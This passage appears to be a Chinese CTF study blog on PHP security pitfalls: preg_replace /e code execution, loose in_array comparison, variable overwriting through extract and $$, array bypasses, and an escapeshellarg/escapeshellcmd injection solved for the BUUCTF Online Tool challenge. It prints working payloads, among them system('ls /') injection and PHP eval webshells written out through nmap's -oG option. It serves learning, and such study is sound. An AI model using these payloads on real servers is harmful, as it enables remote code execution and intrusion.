<p>我们 <strong>var_dump</strong> 一下 <strong>$_GET</strong> 数组，会发现我们传上去的 <strong>.*</strong> 变成了 <strong>_*</strong> ，如下图所示：</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-301140aa-9ddd-1.png" alt="20180812110955-301140aa-9ddd-1"></p>
<p>这是由于在PHP中，对于传入的非法的 <strong>$_GET</strong> 数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。我们可以 <strong>fuzz</strong> 一下PHP会将哪些符号替换成下划线，发现有：（这是非法字符不为首字母的情况）<img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-303b094e-9ddd-1.png" alt="20180812110955-303b094e-9ddd-1"></p>
<p>有<code>空格</code>  <code>+</code>  <code>.</code>  <code>[</code> </p>
<p>当非法字符为首字母时，只有点号会被替换成下划线：</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110955-3055c356-9ddd-1.png" alt="20180812110955-3055c356-9ddd-1"></p>
<p>所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可执行 <strong>phpinfo</strong> 函数。这里我提供一个 <strong>payload</strong> ： <strong>\S*&#x3D;${phpinfo()}</strong> 执行结果如下：</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/20180812110956-30652e5e-9ddd-1.png" alt="20180812110956-30652e5e-9ddd-1"></p>
<p>这里是利用<code>\S</code>匹配任意非空白字符，所以可以代替   <code>.</code></p>
<p>这里还有个坑</p>
<p>报错：<strong>Deprecated</strong>: preg_replace(): The &#x2F;e modifier is deprecated, use preg_replace_callback instead in…</p>
<p>查的资料表示&#x2F;e模式在php5.5.x版本已经弃用了，但是在5.6.9版本下，虽然会报错，但是还能够使用这个特性<br>然后7.0之后的版本就不能用了</p>
<h5 id="爬坑3"><a href="#爬坑3" class="headerlink" title="爬坑3"></a>爬坑3</h5><p>下面再说说我们为什么要匹配到 <strong>{${phpinfo()}}</strong> 或者 <strong>${phpinfo()}</strong> ，才能执行 <strong>phpinfo</strong> 函数，这是一个小坑。这实际上是 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.variables.variable.php">PHP可变变量</a> 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); // 结果：布尔 true</span><br><span class="line">var_dump(strtolower(phpinfo()));// 结果：字符串 &#x27;1&#x27;</span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;1&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：字符串&#x27;11&#x27;</span><br><span class="line"></span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：空字符串&#x27;&#x27;</span><br><span class="line">var_dump(preg_replace(&#x27;/(.*)/ie&#x27;,&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;,&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;));// 结果：空字符串&#x27;&#x27;</span><br><span class="line">这里的&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;执行后相当于 strtolower(&quot;&#123;$&#123;1&#125;&#125;&quot;) 又相当于 strtolower(&quot;&#123;null&#125;&quot;) 又相当于 &#x27;&#x27; 空字符串</span><br></pre></td></tr></table></figure>

<p>到了这里我们就用调用其内部函数了，进行RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="0x06：in-array宽松比较"><a href="#0x06：in-array宽松比较" class="headerlink" title="0x06：in_array宽松比较"></a>0x06：in_array宽松比较</h2><p>看官方</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span>( <span class="keyword">mixed</span> <span class="variable">$needle</span>, <span class="keyword">array</span> <span class="variable">$haystack</span>[, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span>] )</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>needle</code></p>
<p>待搜索的值。       <strong>Note</strong>:         如果 <code>needle</code> 是字符串，则比较是区分大小写的。        </p>
</li>
<li><p><code>haystack</code></p>
<p>待搜索的数组。       </p>
</li>
<li><p><code>strict</code></p>
<p>如果第三个参数 <code>strict</code> 的值为      <strong><code>TRUE</code></strong> 则 <strong>in_array()</strong> 函数还会检查      <code>needle</code> 的<a href="mk:@MSITStore:D:\mytools\WEB\PHPSC\PHP7中文手册(2018).chm::/res/language.types.html">类型</a>是否和      <code>haystack</code> 中的相同。</p>
</li>
</ul>
<p>且in_array是区分大小写的</p>
<p>如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$os</span> = <span class="keyword">array</span>(<span class="string">&quot;Mac&quot;</span>, <span class="string">&quot;NT&quot;</span>, <span class="string">&quot;Irix&quot;</span>, <span class="string">&quot;Linux&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;Irix&quot;</span>, <span class="variable">$os</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Got Irix&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&quot;mac&quot;</span>, <span class="variable">$os</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Got mac&quot;</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>第二个条件失败，因为 <strong>in_array()</strong>        是区分大小写的，所以以上程序显示为：     </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Got Irix</span><br></pre></td></tr></table></figure>

<p><strong>Example #2 *<em>in_array()*</em> 严格类型检查例子</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;1.10&#x27;</span>, <span class="number">12.4</span>, <span class="number">1.13</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;12.4&#x27;</span>, <span class="variable">$a</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#x27;12.4&#x27; found with strict check\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="number">1.13</span>, <span class="variable">$a</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;1.13 found with strict check\n&quot;</span>;</span><br><span class="line">&#125;<span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.13 found with strict check</span><br></pre></td></tr></table></figure>

<p>因为数组中 12.4 是数字 而匹配的是字符串</p>
<p>例如这道题：</p>
<p><img src="https://p0.ssl.qhimg.com/t01ddee9dbe4fec596b.png" alt="img"></p>
<p>上面的代码对下面无影响，直接写webshell即可，但是要注意文件名开头必须是以数字开头的</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?n=<span class="number">1.</span>php</span><br><span class="line">DATA:</span><br><span class="line">content=&lt;?php system(<span class="string">&#x27;cat *.php&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>

<p>因为是宽松匹配 所以它 匹配到 <code>1.php</code> 中的1就通过了</p>
<h2 id="0x07-变量覆盖"><a href="#0x07-变量覆盖" class="headerlink" title="0x07:变量覆盖"></a>0x07:变量覆盖</h2><h3 id="第一种：extract函数、parse-str函数"><a href="#第一种：extract函数、parse-str函数" class="headerlink" title="第一种：extract函数、parse_str函数"></a>第一种：extract函数、parse_str函数</h3><p><code>extract()</code> 函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖</p>
<blockquote>
<p><code>extract()</code> 函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>，当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖</p>
</blockquote>
<p><img src="https://p5.ssl.qhimg.com/t019c197edf2a17fb3b.png" alt="img"></p>
<p><code>POST</code>方法传输进来的值通过<code>extrace()</code>函数处理，直接传入以<code>POST</code>的方式传入<code>pass=1&amp;thepassword_123=1</code>就可以进行将原本的变量覆盖，并且使两个变量相等即可。</p>
<p>还有就是这两个函数如果结合起来使用，也会造成变量覆盖</p>
<p><img src="https://p2.ssl.qhimg.com/t01ee4693c210d149c7.png" alt="img"></p>
<p>代码中同时含有<code>parse_str和extract($_POST)</code>可以先将GET方法请求的解析成变量，然后再利用extract() 函数从数组中将变量导入到当前的符号表,故payload为：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>

<p>代码中同时含有<code>parse_str和extract($_POST)</code>可以先将GET方法请求的解析成变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]</span><br><span class="line">说明：查询(query)的字符串</span><br><span class="line">利用GET请求绕过POST的变量覆盖？</span><br></pre></td></tr></table></figure>

<h3 id="第二种：-变量覆盖"><a href="#第二种：-变量覆盖" class="headerlink" title="第二种：$$变量覆盖"></a>第二种：$$变量覆盖</h3><p>$$变量覆盖要具体结合代码来看，可能会需要借助<strong>某个参数进行传递值</strong>，也有可能使用**$GLOBALS（引用全局作用域中可用的全部变量）**来做题，例如：</p>
<p><img src="https://p3.ssl.qhimg.com/t0167fa970a0ffb85c8.png" alt="img"></p>
<p>这道题便需要借助某个参数进行传递值，具体也不详细说明了，payload如下：这是比较常见的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?Sn0w=flag</span><br><span class="line">DATA:</span><br><span class="line">error=Sn0w</span><br><span class="line">实际在代码中为</span><br><span class="line">GET:</span><br><span class="line">$Sn0w=$flag</span><br><span class="line">POST:</span><br><span class="line">$error=$Sn0w</span><br></pre></td></tr></table></figure>

<h2 id="0x08-通过数组绕过"><a href="#0x08-通过数组绕过" class="headerlink" title="0x08:通过数组绕过"></a>0x08:通过数组绕过</h2><h3 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h3><p><img src="https://p4.ssl.qhimg.com/t0180b27e3648257454.png" alt="img"></p>
<p>ereg()函数存在null截断漏洞。可以%00截断，遇到%00则默认为字符串的结束所以可以绕过一下正则的表达。</p>
<p>ereg()只能处理字符串的，遇到数组做参数返回NULL。</p>
<p>空字符串的类型是<code>string</code>，<code>NULL</code>的类型是<code>NULL</code>,<code>false、true</code>是<code>boolean</code>类型</p>
<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p><img src="https://p2.ssl.qhimg.com/t01a4d9fbc942782a37.png" alt="img"></p>
<p>strpos()函数如果传入数组，便会返回NULL</p>
<h4 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h4><p><code>strcmp()</code>函数比较两个字符串(区分大小写）,定义中是比较<strong>字符串类型</strong>的，但如果输入其他类型这个函数将发生错误，在官方文档的说明中说到在<code>php 5.2</code>版本之前，利用<code>strcmp</code>函数将数组与字符串进行比较会返回<code>-1</code>，但是从<code>5.3</code>开始，会返回<code>0</code>。</p>
<p><img src="https://p2.ssl.qhimg.com/t018d3fcb5df94910fc.png" alt="img"></p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#POST DATA</span></span><br><span class="line">pass[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>数组和字符进行比较结果不会返回<code>1</code>，即为<code>false</code>,加上非的作用，即可变成<code>true</code>,则满足条件</p>
<h2 id="0x09：PHP自身特性"><a href="#0x09：PHP自身特性" class="headerlink" title="0x09：PHP自身特性"></a>0x09：PHP自身特性</h2><h4 id="PHP的变量名格式"><a href="#PHP的变量名格式" class="headerlink" title="PHP的变量名格式"></a>PHP的变量名格式</h4><p><strong>在CTF中也经常考察PHP的变量名格式，例如这道题：</strong></p>
<p><img src="https://p4.ssl.qhimg.com/t014ac57dd428b280c6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[&#x27;CTF_SHOW.COM&#x27;]`无法传入参数，这是因为PHP变量名应该只有**数字字母下划线。**而且GET或POST方式传进去的变量名,会自动将`**空格**` `+ . [`转换为`_</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DATA:</span><br><span class="line">CTF_SHOW=<span class="number">1</span>&amp;CTF[SHOW.COM=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h1 id="不明所以"><a href="#不明所以" class="headerlink" title="不明所以"></a><strong>不明所以</strong></h1><h4 id="PHP数字可与字符做运算"><a href="#PHP数字可与字符做运算" class="headerlink" title="PHP数字可与字符做运算"></a>PHP数字可与字符做运算</h4><p><img src="https://p1.ssl.qhimg.com/t01f32767c97ad68dfe.png" alt="img"></p>
<p>但是这样能干嘛呢？</p>
<h2 id="0x10：escapeshellarg-amp-escapeshellcmd函数绕过"><a href="#0x10：escapeshellarg-amp-escapeshellcmd函数绕过" class="headerlink" title="0x10：escapeshellarg&amp;escapeshellcmd函数绕过"></a>0x10：escapeshellarg&amp;escapeshellcmd函数绕过</h2><p><strong>escapeshellarg</strong></p>
<p><img src="https://p0.ssl.qhimg.com/t0138ca46921ef8b5d9.png" alt="img"></p>
<p><strong>escapeshellcmd</strong></p>
<p><img src="https://p0.ssl.qhimg.com/t0140e2566232377e3e.png" alt="img"></p>
<p>先通过例子来查看一下<strong>escapeshellarg</strong>函数的作用吧</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="function">php </span></span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">(escapeshellarg(<span class="string">&quot;123&quot;</span>))</span></span>;</span><br><span class="line"><span class="built_in">var_dump</span>(<span class="built_in">escapeshellarg</span>(<span class="string">&quot;12&#x27;     3&quot;</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t0135e9bd6c4f45f74f.png" alt="img"></p>
<p>在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
<p><img src="https://p1.ssl.qhimg.com/t01ac3e22180a668caf.png" alt="img"></p>
<p>所以即使参数用了 <strong>escapeshellarg</strong> 函数过滤单引号，但参数在拼接命令的时候如果用了双引号的话还是会导致命令执行的漏洞。</p>
<p>再来看一下<strong>escapeshellcmd</strong> 函数的作用</p>
<p><img src="https://p4.ssl.qhimg.com/t011c090c3652b7e746.png" alt="img"></p>
<p>两个函数都会对单引号进行处理，但是有区别的,如下：</p>
<p><img src="https://p5.ssl.qhimg.com/t01a632f970782dadc5.png" alt="img"></p>
<p>对于单个单引号, <strong>escapeshellarg</strong> 函数转义后,还会在左右各加一个单引号,但 <strong>escapeshellcmd</strong> 函数是直接加一个转义符，对于成对的单引号, <strong>escapeshellcmd</strong> 函数默认不转义,但 <strong>escapeshellarg</strong> 函数转义</p>
<p>那既然有这个差异，如果<strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 一起出现会有什么问题<br><strong>测试</strong></p>
<p><img src="https://p1.ssl.qhimg.com/t01b0dbc77d63d0ef1e.png" alt="img"></p>
<p><strong>结果</strong></p>
<p><img src="https://p0.ssl.qhimg.com/t01ce491028baf76639.png" alt="img"></p>
<p><strong>分析</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一开始传入的参数</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1&#x27;</span> -v -d a=<span class="number">1</span></span><br><span class="line">经过escapeshellarg函数处理，先转义再用单引号括起来</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27; -v -d a=1&#x27;</span></span><br><span class="line">再经过escapeshellcmd函数处理，数中的\以及a=<span class="number">1&#x27;</span>中的单引号进行处理转义</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27; -v -d a=1\&#x27;</span></span><br><span class="line">由于这一步的处理，使得\\被解释成了\而不再是转义字符，所以单引号配对连接之后将语句分割为三个部分</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01ebfca559b87ec852.png" alt="img"></p>
<p>因此最后system函数是对<code>127.0.0.1\</code>发起请求，POST 数据为<code>a=1&#39;</code>，如果两个函数翻过来则不会出现这个问题</p>
<p><img src="https://p3.ssl.qhimg.com/t012e569564b9d49eaa.png" alt="img"></p>
<p>如果先用的escapeshellarg 再使用escapeshellcmd就会引发上面的漏洞</p>
<p>我们可以先看下这个例子</p>
<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很显然题目中的命令字符串不完整，我们可以攻击</p>
<p>先看escapeshellarg</p>
<p>关于nmap</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wdcxccsdn/article/details/55805803">https://blog.csdn.net/wdcxccsdn/article/details/55805803</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41880069/article/details/82792896">https://blog.csdn.net/qq_41880069/article/details/82792896</a></p>
<p>最后要为空格，因为如果不加，转义出来的反斜杠会和php后缀连在一起，导致上传失败,文件路径在这</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/image-20221102194431363.png" alt="image-20221102194431363"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[1]);?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>

<p>先经过escapeshellarg，在两边加上<code>&#39;</code>,并将原来的两个<code>&#39;</code>转义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\&#x27;&lt;?php eval$_POST[1]($_POST[1]);?&gt; -oG 1.php \&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>再经过escapeshellcmd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\\&#x27;&lt;?php eval$_POST[1]($_POST[1]);?&gt; -oG 1.php \\&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>这样的话就能将</p>
<p>然后到这个页面就可以传马了<code>&lt;?php eval$_POST[1]($_POST[1]);?&gt; -oG 1.php</code>执行，而如果这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[1]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure>

<p>就会变成这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\\&#x27;&lt;?php eval$_POST[1]($_POST[1]);?&gt; -oG 1.php\\&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>\与1.php连接导致传码失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c5f84d64-7d37-4675-a755-17d10e21fa59.node4.buuoj.cn:81/1733f2e3dee6b1c4f721ecd2ff9de050/1.php</span><br></pre></td></tr></table></figure>

<p>还可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://29777219-7b5a-45fe-acaf-af7c038602a8.node4.buuoj.cn:81/?host=&#x27;&lt;?php echo `cat /f*`;?&gt; -oG 4.php &#x27;</span><br></pre></td></tr></table></figure>

<p>Nmap命令模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap [扫描参数] [时间参数] [目标地址] [输出参数]</span><br><span class="line"></span><br><span class="line">默认扫描参数：-sS 隐蔽扫描，只发送 SYN</span><br><span class="line">默认时间参数：-T3 并行扫描</span><br></pre></td></tr></table></figure>

<p>我们主要了解一下输出函数‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-o[ANXGS]</span><br></pre></td></tr></table></figure>

<p>-oA：结果输出为所有格式文件<br>-oN：结果输出为普通文件<br>-oX：结果输出为 xml 文件<br>-oG：结果输出为 grep 文件<br>-oS：结果输出为乱码形式文件</p>
<h2 id="0x11：PHP精度绕过缺陷"><a href="#0x11：PHP精度绕过缺陷" class="headerlink" title="0x11：PHP精度绕过缺陷"></a>0x11：PHP精度绕过缺陷</h2><p>几次都碰到这个点，记录一下，省的以后忘了再去查</p>
<p><strong>浮点运算的坑</strong></p>
<p>在用PHP进行浮点数的运算中,经常会出现一些和预期结果不一样的值，先来看个小例子</p>
<p><img src="https://p1.ssl.qhimg.com/t01c852e37ce4ea7c31.png" alt="img"></p>
<p>输出的是57，而我们预想的应该是58</p>
<p>具体详细的原理可以看这位师傅的描述<br><a target="_blank" rel="noopener" href="http://www.haodaquan.com/12">http://www.haodaquan.com/12</a></p>
<p>简单的说因为PHP 通常使用 IEEE 754 双精度格式而且由于浮点数的精度有限的原因。除此之外取整而导致的最大相对误差为 <code>1.11e-16</code>,当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了，如下图：</p>
<p><img src="https://p1.ssl.qhimg.com/t01f061707d326ceca6.png" alt="img"></p>
<p>再来看一道ciscn2020初赛的题，便考察了这一点：</p>
<p><strong>easytrick</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">class trick&#123;</span><br><span class="line">    public <span class="variable">$trick1</span>;</span><br><span class="line">    public <span class="variable">$trick2</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;trick1 = (string)<span class="variable">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$this</span>-&gt;trick1) &gt; 5 || strlen(<span class="variable">$this</span>-&gt;trick2) &gt; 5)&#123;</span><br><span class="line">            die(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;trick1 !== <span class="variable">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="variable">$this</span>-&gt;trick1) === md5(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable">$this</span>-&gt;trick1 != <span class="variable">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>看了Drom师傅的博客学到了这种方法：</p>
<p>因为这道题是考察<strong>浮点数精度问题导致的大小比较以及函数处理问题</strong>，当小数小于<code>10^-16</code>后，PHP对于小数就大小不分了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.000000000000000 == 1) &gt;&gt; TRUE</span><br><span class="line">var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01886e21d4e23fc47f.png" alt="img"></p>
